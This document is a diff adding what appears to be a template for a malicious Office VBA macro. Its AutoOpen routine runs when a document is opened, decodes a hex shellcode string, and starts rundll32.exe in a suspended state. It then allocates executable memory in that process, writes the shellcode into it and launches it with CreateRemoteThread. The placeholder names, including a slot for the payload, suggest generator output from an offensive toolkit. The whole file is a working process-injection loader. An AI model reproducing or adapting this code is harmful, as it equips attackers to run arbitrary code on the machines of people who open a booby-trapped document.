@@ -1,0 +1,125 @@
+Private Type PROCESS_INFORMATION
+    hProcess As Long
+    hThread As Long
+    dwProcessId As Long
+    dwThreadId As Long
+End Type
+
+Private Type STARTUPINFO
+    cb As Long
+    lpReserved As String
+    lpDesktop As String
+    lpTitle As String
+    dwX As Long
+    dwY As Long
+    dwXSize As Long
+    dwYSize As Long
+    dwXCountChars As Long
+    dwYCountChars As Long
+    dwFillAttribute As Long
+    dwFlags As Long
+    wShowWindow As Integer
+    cbReserved2 As Integer
+    lpReserved2 As Long
+    hStdInput As Long
+    hStdOutput As Long
+    hStdError As Long
+End Type
+
+Private Declare PtrSafe Function createRemoteThread Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, _
+    ByVal lpThreadAttributes As Long, _
+    ByVal dwStackSize As Long, _
+    ByVal lpStartAddress As LongPtr, _
+    lpParameter As Long, _
+    ByVal dwCreationFlags As Long, _
+    lpThreadID As Long) As LongPtr
+
+Private Declare PtrSafe Function virtualAllocEx Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, _
+    ByVal lpAddr As Long, _
+    ByVal lSize As Long, _
+    ByVal flAllocationType As Long, _
+    ByVal flProtect As Long) As LongPtr
+
+Private Declare PtrSafe Function writeProcessMemory Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, _
+    ByVal lDest As LongPtr, _
+    ByRef Source As Any, _
+    ByVal Length As Long, _
+    ByVal LengthWrote As LongPtr) As Boolean
+
+Private Declare PtrSafe Function createProcessA Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, _
+    ByVal lpCommandLine As String, _
+    lpProcessAttributes As Any, _
+    lpThreadAttributes As Any, _
+    ByVal bInheritHandles As Long, _
+    ByVal dwCreationFlags As Long, _
+    lpEnvironment As Any, _
+    ByVal lpCurrentDirectory As String, _
+    lpStartupInfo As STARTUPINFO, _
+    lpProcessInformation As PROCESS_INFORMATION) As Boolean
+
+Private Declare PtrSafe Function getProcessHandle Lib "kernel32" Alias "GetCurrentProcess" () As LongLong
+
+Sub AutoOpen()
+
+Const aVAR8a = &H1000
+Const aVAR9a = &H40
+
+Dim sc As String
+Dim aVAR1a As Long
+Dim aVAR2a() As Byte
+Dim aVAR3a As LongLong
+Dim aVAR4a As LongLong
+Dim aVAR5a As String
+Dim aVAR6a As STARTUPINFO
+Dim aVAR7a As PROCESS_INFORMATION
+
+aPAYLOADa
+
+aVAR1a = Len(sc) / 2
+ReDim aVAR2a(0 To aVAR1a)
+
+For aVAR10a = 0 To aVAR1a - 1
+    If aVAR10a = 0 Then
+        pos = aVAR10a + 1
+    Else
+        pos = aVAR10a * 2 + 1
+    End If
+    Value = Mid(sc, pos, 2)
+    aVAR2a(aVAR10a) = Val("&H" & Value)
+Next
+
+res = createProcessA(aVAR5a, _
+    "C:\Windows\System32\rundll32.exe", _
+    ByVal 0&, _
+    ByVal 0&, _
+    ByVal 1&, _
+    ByVal 4&, _
+    ByVal 0&, _
+    aVAR5a, _
+    aVAR6a, _
+    aVAR7a)
+
+newAllocBuffer = virtualAllocEx(aVAR7a.hProcess, _
+    0, _
+    UBound(aVAR2a), _
+    aVAR8a, _
+    aVAR9a)
+
+For aVAR11a = 0 To UBound(aVAR2a)
+    myByte = aVAR2a(aVAR11a)
+    res = writeProcessMemory(aVAR7a.hProcess, _
+        newAllocBuffer + aVAR11a, _
+        aVAR2a(aVAR11a), _
+        1, _
+        ByVal 0&)
+Next aVAR11a
+
+res = createRemoteThread(aVAR7a.hProcess, _
+    0, _
+    0, _
+    newAllocBuffer, _
+    0, _
+    0, _
+    0)
+
+End Sub
